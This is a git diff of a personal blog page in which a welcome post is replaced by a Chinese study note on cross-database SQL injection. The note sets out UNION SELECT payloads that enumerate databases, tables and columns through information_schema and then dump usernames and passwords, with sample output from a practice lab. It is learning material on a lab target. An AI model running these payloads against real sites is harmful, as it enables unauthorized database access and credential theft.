@@ -3,7 +3,7 @@
         <head>
         <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no" />
         <meta charset="utf-8">
-        <title>Welcome to Place of Serenity | my blog</title>
+        <title>SQL注入笔记02 | my blog</title>
         <link rel="stylesheet" href="https://Place-Serenity.github.io/styles/main.css">
         <link rel="stylesheet" href="https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css">
         <link href="https://cdn.bootcss.com/animate.css/3.7.2/animate.min.css" rel="stylesheet">
@@ -49,32 +49,82 @@
                 <div class="mdui-row">
                         <div class="mdui-col-md-8 mdui-col-offset-md-2 ">
                                 <article class="mdui-p-a-2 post animated fadeIn" style="animation-delay: 0.8s;animation-duration: 2s">
-                                    <div class="post-title  mdui-m-b-1">Welcome to Place of Serenity</div>
-                                    <div class="mdui-typo-body-2 mdui-m-b-2" datetime="2020-04-24 21:00:00">2020-04-24 21:00:00 / 1 min read</div>
-                                    <div class="mdui-m-b-2 mdui-typo post-neirong"><p>👏  欢迎</p>
-<p>😘 Enjoy~</p>
-<p>Place of Serenity，意为宁静之地。</p>
-<p>最近也发生了很多事，很乱了算是，所以给自己的博客取了这个名字。<br>
-未来这个博客会陪伴自己很久吧。<br>
-假期呢，就每天写一写学习网安的心得，登岛开学了呢，就写一写RM搞机日常。<br>
-偶尔呢，写一写影评，亦或是某些书籍的读后感。</p>
-<p>emmmm<br>
-关于这个博客，目前只是一个空壳，未来会不断完善吧。</p>
-<p>自己呢，<br>
-就在这个宁静之地做一些可以让自己变的厉害的事，<br>
-做一些自己喜欢的事。<br>
-嘿嘿😜超级棒！！！</p>
-<p>🙃欢迎大家的访问和交流🙃</p>
-<p>最后留下自己的个人邮箱：eternity.666serendipity@gmail</p>
+                                    <div class="post-title  mdui-m-b-1">SQL注入笔记02</div>
+                                    <div class="mdui-typo-body-2 mdui-m-b-2" datetime="2020-05-05 00:06:30">2020-05-05 00:06:30 / 3 min read</div>
+                                    <div class="mdui-m-b-2 mdui-typo post-neirong"><p>跨库注入</p>
+<p>如果要应用跨库注入，有一个条件，那就是当前数据库用户必须为root用户，才可以对整个数据库进行操作</p>
+<p>确定用户：</p>
+<p>user()确定用户</p>
+<p>如果回显为root@localhost或者root@127.0.0.1只要@号前面为root，则代表该数据库用户为root</p>
+<p>跨库注入过程：</p>
+<p>第一步：</p>
+<p>获取当前所有的数据库：</p>
+<p>存有所有数据库的表名为：</p>
+<p>information_schema.schemata存储所有数据库</p>
+<p>schema_name数据库名</p>
+<p>获取当前所有数据库：</p>
+<p>union select 1,group_concat(schema_name),3 from information_schema.schemata</p>
+<p>/*<br>
+http://IP/Less-1/?id='<br>
+union select 1,group_concat(schema_name),3 from information_schema.schemata --+</p>
+<p>获取到了所有的数据库名：</p>
+<p>Welcome  Dhakkan<br>
+Your Login name: information_schema , challenges , mysql , performance_schema , security<br>
+Your Password:3</p>
+<p>*/</p>
+<p>第二步：</p>
+<p>获取你要注入的数据库的表名称：</p>
+<p>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='pikachu'</p>
+<p>/*</p>
+<ol>
+<li>information_schema</li>
+</ol>
+<p>Welcome  Dhakkan<br>
+Your Login  name: CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_COLUMN_USAGE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,TABLES,TABLESPACES,TABLE_C<br>
+Your Password:3</p>
+<p>emmmm正如所见，获得了一堆的表名。</p>
+<ol start="2">
+<li>challenges</li>
+</ol>
+<p>Welcome  Dhakkan<br>
+Your Login name: PXOQBZZBNO<br>
+Your Password:3</p>
+<ol start="3">
+<li>mysql、</li>
+</ol>
+<p>Welcome  Dhakkan<br>
+Your Login  name: columns_priv,db,event,func,general_log,help_category,help_keyword,help_relation,help_topic,host,ndb_binlog_index,plugin,proc,procs_priv,proxies_priv,servers,slow_log,tables_priv,time_zone,time_zone_leap_second,time_zone_name,time_zone_transition,time_zone_transition_type,user<br>
+Your Password:3</p>
+<ol start="4">
+<li>performance_schema</li>
+</ol>
+<p>Welcome  Dhakkan<br>
+Your Login  name: cond_instances,events_waits_current,events_waits_history,events_waits_history_long,events_waits_summary_by_instance,events_waits_summary_by_thread_by_event_name,events_waits_summary_global_by_event_name,file_instances,file_summary_by_event_name,file_summary_by_instance,mutex_instances,performance_timers,rwlock_instances,setup_consumers,set<br>
+Your Password:3</p>
+<ol start="5">
+<li>security</li>
+</ol>
+<p>Welcome  Dhakkan<br>
+Your Login name:emails,referers,uagents,users<br>
+Your Password:3</p>
+<p>*/</p>
+<p>第三步：</p>
+<p>获取你要注入的数据库的列名称：</p>
+<p>union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' and table_schema='pikachu'</p>
+<p>第四步：</p>
+<p>获取你要注入的数据库的数据：</p>
+<p>union select 1,group_concat(username),group_concat(password) from pikachu.users</p>
+<p>跨库注入首先要获取所有数据库名称</p>
+<p><strong>在查询表名，列名时，必须限定你要注入的数据库名称</strong></p>
 </div>
                                     <div class="mdui-divider mdui-m-b-2"></div>
                                     <div class="mdui-row-xs-2 post-fenye">
                                        
-                                        <div class="mdui-col"> <div class="mdui-text-left"><a href="https://Place-Serenity.github.io/426-c-zuo-ye/">4.26 c作业</a></div></div>
+                                        <div class="mdui-col"> </div>
                                         
 
                                         
-                                        <div class="mdui-col"></div>
+                                        <div class="mdui-col"><div class="mdui-text-right "><a href="https://Place-Serenity.github.io/sql-zhu-ru-bi-ji-01/">SQL注入笔记01</a></div> </div>
                                        
                                       </div>
                                    
